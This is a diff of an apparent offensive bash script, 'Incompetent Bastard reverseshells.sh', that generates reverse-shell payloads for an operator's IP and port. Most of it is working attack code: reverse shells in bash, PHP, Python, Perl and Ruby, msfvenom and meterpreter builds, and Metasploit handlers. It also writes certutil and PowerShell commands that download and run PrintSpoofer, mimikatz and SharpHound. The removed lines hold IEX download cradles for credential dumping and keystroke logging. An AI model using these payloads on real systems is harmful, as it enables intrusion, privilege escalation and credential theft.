@@ -13,11 +13,18 @@ BESTAND=${3:-}
 
 echo "[*] Incompentent Bastard v${VERSIE}"
 
+
+if [ -z "$BESTAND" ]; then
+  BESTAND='shell'
+fi
+
 if [ -z "$localnic" ]; then
 
 
 
-  echo "incompetentbastard reverseshell.sh
+  echo "Incompetent Bastard reverseshells.sh
+
+Excessive handcrafted reverse shells with love and minimal care...
 
 Generates some reverse shells, macro's and a txt file for some good ol copy paste.
 Currently default's to port ${PORT} you. Change this by giving the port als a second option.
@@ -40,10 +47,6 @@ if [ "$localport" == $RE ]; then
 fi
 
 
-if [ -z "$BESTAND" ]; then
-  BESTAND='shell'
-fi
-
 mkdir -p payloads/
 
 #todo: move this to globalmeuk.sh
@@ -60,14 +63,24 @@ else
 fi
 
 
-echo "[+] Generation payloads for ${IP} on port ${PORT}"
-echo '#SHELLS' > http/payloads/${BESTAND}_${PORT}.txt
+echo "[+] Take your time for some excessive handcrafted reverse shells with love and minimal care for ${IP} on port ${PORT}"
+echo "[.] Now baking BASH reverse TCP shells..."
+echo '# Incompetent Bastard' > http/payloads/${BESTAND}_${PORT}.txt
+echo 'Excessive handcrafted reverse shells with love and minimal care.' >> http/payloads/${BESTAND}_${PORT}.txt
+echo "# Bash TCP" >> http/payloads/${BESTAND}_${PORT}.txt
 echo 'bash -i >& /dev/tcp/'${IP}'/'${PORT}' 0>&1' >> http/payloads/${BESTAND}_${PORT}.txt
-echo '0<&196;exec 196<>/dev/tcp/'${IP}'/'${PORT}'; sh <&196 >&196 2>&196' >> http/payloads/${BESTAND}_${PORT}.txt
+echo "bash -i >& /dev/tcp/${IP}/${PORT} 0>&1" > http/commands/bashtcp1
+echo '0<&888;exec 888<>/dev/tcp/'${IP}'/'${PORT}'; sh <&888 >&888 2>&888' >> http/payloads/${BESTAND}_${PORT}.txt
+echo "0<&888;exec 888<>/dev/tcp/${IP}/${PORT}; sh <&888 >&888 2>&888" > http/commands/bashtcp2
 echo '/bin/bash -l > /dev/tcp/'${IP}'/'${PORT}' 0<&1 2>&1' >> http/payloads/${BESTAND}_${PORT}.txt
-echo '#UDP nc -u -lnvp ${PORT}' >> http/payloads/${BESTAND}_${PORT}.txt
+echo "/bin/bash -l > /dev/tcp/${IP}/${PORT} 0<&1 2>&1" > http/commands/bashtcp3
+echo "[.] Now baking variants reverse TCP shells, like dash, sh etc..." 
+echo '# UDP nc -u -lnvp ${PORT}\n\n' >> http/payloads/${BESTAND}_${PORT}.txt
+echo 'bash -i >& /dev/udp/'${IP}'/'${PORT}' 0>&1'  >> http/payloads/${BESTAND}_${PORT}.txt
+echo "bash -i >& /dev/udp/${IP}/${PORT} 0>&1"  > http/commands/bashudp1
 echo 'sh -i >& /dev/udp/'${IP}'/'${PORT}' 0>&1'  >> http/payloads/${BESTAND}_${PORT}.txt
-echo '#PHP' >> http/payloads/${BESTAND}_${PORT}.txt
+echo "sh -i >& /dev/udp/${IP}/${PORT} 0>&1"  > http/commands/shudp1
+echo '# PHP\n\n' >> http/payloads/${BESTAND}_${PORT}.txt
 echo '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '${IP}' '${PORT}' >/tmp/f");?>' >> http/payloads/${BESTAND}_${PORT}.txt
 echo 'php -r '"'\$sock=fsockopen(\"${IP}\",${PORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"'' >> http/payloads/${BESTAND}_${PORT}.txt
 echo 'php -r '"'\$sock=fsockopen(\"${IP}\",${PORT});shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'"'' >> http/payloads/${BESTAND}_${PORT}.txt
@@ -75,68 +88,135 @@ echo 'php -r '"'\$sock=fsockopen(\"${IP}\",${PORT});\`/bin/sh -i <&3 >&3 2>&3\`;
 echo 'php -r '"'\$sock=fsockopen(\"${IP}\",${PORT});system(\"/bin/sh -i <&3 >&3 2>&3\");'"'' >> http/payloads/${BESTAND}_${PORT}.txt
 echo 'php -r '"'\$sock=fsockopen(\"${IP}\",${PORT});passthru(\"/bin/sh -i <&3 >&3 2>&3\");'"'' >> http/payloads/${BESTAND}_${PORT}.txt
 echo 'php -r '"'\$sock=fsockopen(\"${IP}\",${PORT});popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");'"'' >> http/payloads/${BESTAND}_${PORT}.txt
-
-echo '#PYTHON' >> http/payloads/${BESTAND}_${PORT}.txt
+echo '# PYTHON ' >> http/payloads/${BESTAND}_${PORT}.txt
 echo 'python -c '"'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${IP}\",${PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"'' >> http/payloads/${BESTAND}_${PORT}.txt
 echo 'python -c '"'a=__import__;s=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((\"${IP}\",${PORT}));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'"'' >> http/payloads/${BESTAND}_${PORT}.txt
 echo 'python -c '"'a=__import__;b=a(\"socket\").socket;p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b();s.connect((\"${IP}\",${PORT}));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"/bin/sh\",\"-i\"])'"''  >> http/payloads/${BESTAND}_${PORT}.txt
 
-echo '#PERL' >> http/payloads/${BESTAND}_${PORT}.txt
+echo '# PERL' >> http/payloads/${BESTAND}_${PORT}.txt
 echo 'perl -e '"'use Socket;\$i=\"${IP}\";\$p=${PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"'' >> http/payloads/${BESTAND}_${PORT}.txt
 echo 'perl -MIO -e '"'\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"${IP}:${PORT}\");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'"'' >> http/payloads/${BESTAND}_${PORT}.txt
 
-echo '#RUBY' >> http/payloads/${BESTAND}_${PORT}.txt
+echo '# RUBY' >> http/payloads/${BESTAND}_${PORT}.txt
 echo 'ruby -rsocket -e'"'f=TCPSocket.open(\"${IP}\",${PORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"'' >> http/payloads/${BESTAND}_${PORT}.txt
 echo 'ruby -rsocket -e'"'exit if fork;c=TCPSocket.new(\"${IP}\",\"${PORT}\");loop{c.gets.chomp!;(exit! if \$_==\"exit\");(\$_=~/cd (.+)/i?(Dir.chdir(\$1)):(IO.popen(\$_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{\$_}\"}"'' >> http/payloads/${BESTAND}_${PORT}.txt
 
-
+echo '# MSFVENOM' >> http/payloads/${BESTAND}_${PORT}.txt
 msfvenom -p windows/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f exe > http/payloads/${BESTAND}_${PORT}.exe
+echo "${BESTAND}_${PORT}.exe :: windows/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f exe" >> http/payloads/${BESTAND}_${PORT}.txt
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf > http/payloads/${BESTAND}_${PORT}.elf
+echo "${BESTAND}_${PORT}.elf :: linux/x86/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf " >> http/payloads/${BESTAND}_${PORT}.txt
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf > http/payloads/meterpreter_${PORT}.elf
+echo "meterpreter_${PORT}.elf :: linux/x86/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf" >> http/payloads/${BESTAND}_${PORT}.txt
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf > http/payloads/meter64_${PORT}.elf
+echo "meter64_${PORT}.elf :: linux/x64/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf" >> http/payloads/${BESTAND}_${PORT}.txt
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f macho > http/payloads/${BESTAND}_${PORT}.macho
+echo "${BESTAND}_${PORT}.macho :: osx/x86/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f macho" >> http/payloads/${BESTAND}_${PORT}.txt
 msfvenom -p windows/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f asp > http/payloads/${BESTAND}_${PORT}.asp
+echo "${BESTAND}_${PORT}.asp :: windows/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f asp" >> http/payloads/${BESTAND}_${PORT}.txt
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw > http/payloads/${BESTAND}_${PORT}.jsp
+echo "${BESTAND}_${PORT}.jsp :: java/jsp_shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw" >> http/payloads/${BESTAND}_${PORT}.txt
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f war > http/payloads/${BESTAND}_${PORT}.war
-msfvenom -p cmd/unix/reverse_python LHOST=${IP} LPORT=${PORT} -f raw > http/payloads/${BESTAND}_${PORT}.py
-msfvenom -p cmd/unix/reverse_bash LHOST=${IP} LPORT=${PORT} -f raw > http/payloads/${BESTAND}_${PORT}.sh
-msfvenom -p cmd/unix/reverse_perl LHOST=${IP} LPORT=${PORT} -f raw > http/payloads/${BESTAND}_${PORT}.pl
+echo "${BESTAND}_${PORT}.war :: java/jsp_shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f war" >> http/payloads/${BESTAND}_${PORT}.txt
+msfvenom -p payload/python/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw > http/payloads/tcp${BESTAND}_${PORT}.py
+echo "tcp${BESTAND}_${PORT}.py :: payload/python/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw" >> http/payloads/${BESTAND}_${PORT}.txt
 msfvenom -p php/meterpreter_reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw > http/payloads/meterpreter_${PORT}.php 
+echo "meterpreter_${PORT}.php :: php/meterpreter_reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw " >> http/payloads/${BESTAND}_${PORT}.txt 
 msfvenom --platform=solaris --payload=solaris/x86/${BESTAND}_reverse_tcp LHOST=${IP} LPORT=${PORT}  -f elf -e x86/shikata_ga_nai -b '\x00' > http/payloads/solaris_${PORT}.elf
+echo "${BESTAND}_reverse_tcp.elf :: platform=solaris --payload=solaris/x86/${BESTAND}_reverse_tcp LHOST=${IP} LPORT=${PORT}  -f elf -e x86/shikata_ga_nai -b \x00" >> http/payloads/${BESTAND}_${PORT}.txt 
 
 
-echo "Building the prefered shells :)"
-echo '#POWERSHELL' >> http/payloads/${BESTAND}_${PORT}.txt
-echo '[powershellplaceholder]' >> http/payloads/${BESTAND}_${PORT}.txt
-python3 powershell.py ${IP} ${PORT} ${BESTAND}_${PORT}.txt
 
-
-echo '#Downloads' >> http/payloads/${BESTAND}_${PORT}.txt
-echo "certutil -urlcache -split -f http://${IP}/tools/PrintSpoofer64.exe print.exe" >> http/payloads/${BESTAND}_${PORT}.txt
-echo "certutil -urlcache -split -f http://${IP}/tools/mimi/mimikatz.exe mimi.exe" >> http/payloads/${BESTAND}_${PORT}.txt
-echo "certutil -urlcache -split -f http://${IP}/tools/SharpHound.exe sharphound.exe" >> http/payloads/${BESTAND}_${PORT}.txt
-echo "certutil -urlcache -split -f http://${IP}/payloads/shell_meth.exe meth.exe" >> http/payloads/${BESTAND}_${PORT}.txt
-echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/PrintSpoofer64.exe','c:\windows\\tasks\print.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
-echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/mimi/mimikatz.exe','c:\windows\\tasks\mimi.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
-echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/SharpHound.exe','c:\windows\\tasks\sharphound.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
-echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/shell_meth.exe','c:\windows\\tasks\meth.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
-
+echo '# MSF handlers command.sh' >> http/payloads/${BESTAND}_${PORT}.txt
 echo "use multi/handler \n set payload windows/x64/meterpreter/reverse_https \n set LHOST ${localnic}\n set LPORT 8080 \n run -j" > http/commands/msf_https8080
 echo "use multi/handler \n set payload windows/x64/meterpreter/reverse_https \n set LHOST ${localnic}\n set LPORT ${PORT} \n run -j" > http/commands/msf_https
 echo "use multi/handler \n set payload windows/x64/meterpreter/reverse_tcp \n set LHOST ${localnic} \n set LPORT ${PORT} \n run -j;" > http/commands/msf_tcp
+echo "use multi/handler \n set payload generic/shell_reverse_tcp \n set LHOST ${localnic} \n set LPORT 8080 \n run -j;" > http/commands/msfshell_tcp8080
+echo "use multi/handler \n set payload generic/shell_reverse_tcp \n set LHOST ${localnic} \n set LPORT ${PORT} \n run -j;" > http/commands/msfshell_tcp
+echo 'Payload windows/x64/meterpreter_https' >> http/payloads/${BESTAND}_${PORT}.txt
+echo './command.sh metasploit msf_https8080' >> http/payloads/${BESTAND}_${PORT}.txt
+echo './command.sh metasploit msf_https' >> http/payloads/${BESTAND}_${PORT}.txt
+echo 'Payload windows/x64/meterpreter_tcp' >> http/payloads/${BESTAND}_${PORT}.txt
+echo './command.sh metasploit msf_tcp' >> http/payloads/${BESTAND}_${PORT}.txt
+echo 'Payload generic/shell_reverse_tcp' >> http/payloads/${BESTAND}_${PORT}.txt
+echo './command.sh metasploit msfshell_tcp8080' >> http/payloads/${BESTAND}_${PORT}.txt
+echo './command.sh metasploit msfshell_tcp' >> http/payloads/${BESTAND}_${PORT}.txt
+echo "[.] Building the prefered shells :)"
+echo '# POWERSHELL' >> http/payloads/${BESTAND}_${PORT}.txt
+echo '[powershellplaceholder]' >> http/payloads/${BESTAND}_${PORT}.txt
+python3 powershell.py ${IP} ${PORT} http/payloads/${BESTAND}_${PORT}.txt
+
+
+
+echo '## PrinSpoofer64.exe ' >> http/payloads/${BESTAND}_${PORT}.txt
+echo "certutil -urlcache -split -f http://${IP}/tools/PrintSpoofer64.exe print.exe" >> http/payloads/${BESTAND}_${PORT}.txt
 echo "cd C:\Windows\\\tasks && certutil -urlcache -f http://${IP}/tools/PrintSpoofer64.exe print.exe && print.exe -i -c cmd" > http/commands/printspoofer
-echo "cd C:\Windows\\\tasks && certutil -urlcache -f http://${IP}/tools/mimikatz.exe mimi.exe" > http/commands/mimikatz
-echo "cd C:\Windows\\\tasks && certutil -urlcache -f http://${IP}/tools/SharpHound.exe sharphound.exe" > http/commands/sharphound
-echo "cd C:\Windows\\\tasks && certutil -urlcache -f http://${IP}/payloads/shell_meth.exe meth.exe" > http/commands/certutilmeth
+echo './command.sh [screenname] printspoofer' >> http/payloads/${BESTAND}_${PORT}.txt
+echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/PrintSpoofer64.exe','c:\windows\\tasks\print.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
 echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/PrintSpoofer64.exe','c:\windows\\\tasks\print.exe')" > http/commands/psprintspoofer
-echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/PrintSpoofer64.exe','c:\windows\\\tasks\print.exe') && c:\windows\\\tasks\print.exe -i -c cmd" > http/commands/printerspoofer
+echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/PrintSpoofer64.exe','c:\windows\\\tasks\print.exe') && c:\windows\\\tasks\print.exe -i -c cmd" > http/commands/psprintspooferrun
+echo './command.sh [screenname] psprintspoofer' >> http/payloads/${BESTAND}_${PORT}.txt
+echo './command.sh [screenname] psprintspooferrun' >> http/payloads/${BESTAND}_${PORT}.txt
+
+echo '## MimiKatz.exe' >> http/payloads/${BESTAND}_${PORT}.txt
+echo "certutil -urlcache -split -f http://${IP}/tools/mimi/mimikatz.exe mimi.exe" >> http/payloads/${BESTAND}_${PORT}.txt
+echo "cd C:\Windows\\\tasks && certutil -urlcache -f http://${IP}/tools/mimikatz.exe mimi.exe" > http/commands/mimikatz
+echo './command.sh [screenname] mimikatz' >> http/payloads/${BESTAND}_${PORT}.txt
+echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/mimi/mimikatz.exe','c:\windows\\tasks\mimi.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
 echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/mimi/mimikatz.exe','c:\windows\\\tasks\mimi.exe')" > http/commands/psmimikatz
+echo './command.sh [screenname] psmimikatz' >> http/payloads/${BESTAND}_${PORT}.txt
+
+echo '## SharpHound.exe' >> http/payloads/${BESTAND}_${PORT}.txt
+echo "certutil -urlcache -split -f http://${IP}/tools/SharpHound.exe sharphound.exe" >> http/payloads/${BESTAND}_${PORT}.txt
+echo "cd C:\Windows\\\tasks && certutil -urlcache -f http://${IP}/tools/SharpHound.exe sharphound.exe" > http/commands/sharphound
+echo './command.sh [screenname] sharphound' >> http/payloads/${BESTAND}_${PORT}.txt
+echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/SharpHound.exe','c:\windows\\tasks\sharphound.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
 echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/SharpHound.exe','c:\windows\\\tasks\sharphound.exe')" > http/commands/pssharphound
-echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/SharpHound.exe','c:\windows\\\tasks\sharphound.exe') && c:\windows\\\tasks\sharphound.exe -CollectionMethods All" > http/commands/pssharphound
-echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/shell_meth.exe','c:\windows\\\tasks\meth.exe')" > http/commands/psmeth
+echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/SharpHound.exe','c:\windows\\\tasks\sharphound.exe') && c:\windows\\\tasks\sharphound.exe --CollectionMethods All" > http/commands/pssharphoundrun
+echo './command.sh [screenname] pssharphound' >> http/payloads/${BESTAND}_${PORT}.txt
+echo './command.sh [screenname] pssharphoundrun' >> http/payloads/${BESTAND}_${PORT}.txt
+
+
+echo "## windows/x64/meterpreter TCP  ${PORT}" >> http/payloads/${BESTAND}_${PORT}.txt
+
+
+echo "certutil -urlcache -split -f http://${IP}/payloads/shell_meth.exe meth.exe" >> http/payloads/${BESTAND}_${PORT}.txt
+echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/shell_meth.exe','c:\windows\\tasks\meth.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
 echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/shell_meth.exe','c:\windows\\\tasks\meth.exe') && c:\windows\\\tasks\meth.exe" > http/commands/psmethrun
+echo "cd C:\Windows\\\tasks && certutil -urlcache -f http://${IP}/payloads/shell_meth.exe meth.exe" > http/commands/certutilmeth
+echo './command.sh [screenname] certutilmeth' >> http/payloads/${BESTAND}_${PORT}.txt
+echo './command.sh [screenname] psmethrun' >> http/payloads/${BESTAND}_${PORT}.txt
+
+echo '## windows/x64/meterpreter TCP  8080' >> http/payloads/${BESTAND}_${PORT}.txt
+echo "certutil -urlcache -split -f http://${IP}/payloads/meth8080.exe meth8080.exe" >> http/payloads/${BESTAND}_${PORT}.txt
+echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/meth8080.exe','c:\windows\\tasks\meth8080.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
+echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/meth8080.exe','c:\windows\\\tasks\meth8080.exe')" > http/commands/psmeth8080
+echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/meth8080.exe','c:\windows\\\tasks\meth8080.exe') && c:\windows\\\tasks\meth.exe" > http/commands/psmethrun8080run
+
+
+echo "## windows/x64/reverse_tcp TCP ${PORT}" >> http/payloads/${BESTAND}_${PORT}.txt
+echo "certutil -urlcache -split -f http://${IP}/payloads/methtcp.exe methtcp.exe" >> http/payloads/${BESTAND}_${PORT}.txt
+echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/methtcp.exe','c:\windows\\tasks\methtcp.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
 echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/methtcp.exe','c:\windows\\\tasks\methtcp.exe')" > http/commands/psmethtcp
-echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/methtcp.exe','c:\windows\\\tasks\methtcp.exe') && c:\windows\\\tasks\meth.exe" > http/commands/psmethtcprun
+echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/methtcp.exe','c:\windows\\\tasks\methtcp.exe') && c:\windows\\\tasks\methtcp.exe" > http/commands/psmethtcprun
+echo './command.sh [screenname] psmethtcp' >> http/payloads/${BESTAND}_${PORT}.txt
+echo './command.sh [screenname] psmethtcprun' >> http/payloads/${BESTAND}_${PORT}.txt
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 # Domain Recon
@@ -186,40 +266,6 @@ echo "findstr /S cpassword %logonserver%\sysvol\*.xml \n findstr /S cpassword \$
 echo "reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer \n reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" > http/commands/install_elevated
 
 
-
-# Mimikatz
-## Invoke Mimikatz
-#powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://${IP}//Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"
-
-## Import Mimikatz Module
-#powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('http://${IP}/Invoke-Mimikatz.ps1')"
-
-## Perform DcSync attack
-#Invoke-Mimikatz -Command '"lsadump::dcsync /domain:demodomain /user:sqladmin"'
-
-## Invoke-MassMimikatz
-#powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1');'$env:COMPUTERNAME'|Invoke-MassMimikatz -Verbose"
-
-## Manual Procdump for offline mimikatz
-#.\procdump.exe -accepteula -ma lsass.exe lsass.dmp
-
-
-# Useful Scripts/Commands
-## Use Windows Debug api to pause live processes
-#powershell.exe -nop -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/Pause-Process/master/pause-process.ps1');Pause-Process -ID 1180;UnPause-Process -ID 1180;"
-
-## Import Powersploits invoke-keystrokes
-#powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1')"
-
-## Import Empire's Get-ClipboardContents
-#powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/collection/Get-ClipboardContents.ps1')"
-
-## Import Get-TimedScreenshot
-#powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/obscuresec/PowerShell/master/Get-TimedScreenshot')"
-
-
-
-
 echo 'IEX ()' >> http/payloads/${BESTAND}_${PORT}.txt
 python3 invoke-shellcode.py ${IP} ${PORT}
 
@@ -253,8 +299,6 @@ echo "[+] Building MACRO txt"
 echo '#MACRO' >> http/payloads/${BESTAND}_${PORT}.txt
 python3 macro.py ${IP} ${PORT}
 echo "[+] Done"
-
-
 
 
 
